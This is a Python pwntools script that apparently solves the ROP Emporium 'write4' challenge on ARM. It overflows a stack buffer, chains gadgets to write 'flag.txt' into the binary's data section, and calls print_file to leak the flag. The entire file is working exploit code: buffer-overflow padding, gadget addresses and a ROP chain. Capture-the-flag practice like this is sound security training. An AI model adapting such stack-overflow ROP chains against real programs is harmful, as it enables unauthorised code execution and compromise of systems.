from pwn import *

BINARY = "./write4_armv5-hf"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

p = process(BINARY)

"""
------- str_r3_ptr_r4 -------
0x105ec:  str	r3, [r4]
0x105f0:  pop	{r3, r4, pc}

------- pop_r0_pc -------
0x105f4:  pop	{r0, pc}
"""

str_r3_ptr_r4  = p32(0x105ec)
pop_r3_r4_pc   = p32(0x105f0)
pop_r0_pc      = p32(0x105f4)
bl_print_file  = p32(0x105dc) # bl print_file --> works with <0x104bc> print_file@plt
data_adr       = 0x21024

rop = b"A" * 36

rop += pop_r3_r4_pc
rop += b"flag"
rop += p32(data_adr)

rop += str_r3_ptr_r4
rop += b".txt"
rop += p32(data_adr+4)

rop += str_r3_ptr_r4
rop += b"BBBB"
rop += b"CCCC"

rop += pop_r0_pc
rop += p32(data_adr)
rop += bl_print_file

p.sendline(rop)
log.success(f"ROPchain = {rop}")

flag = p.recvall(timeout=1).split(b'\n')[-3]
log.success(f"FLAG : {flag}")
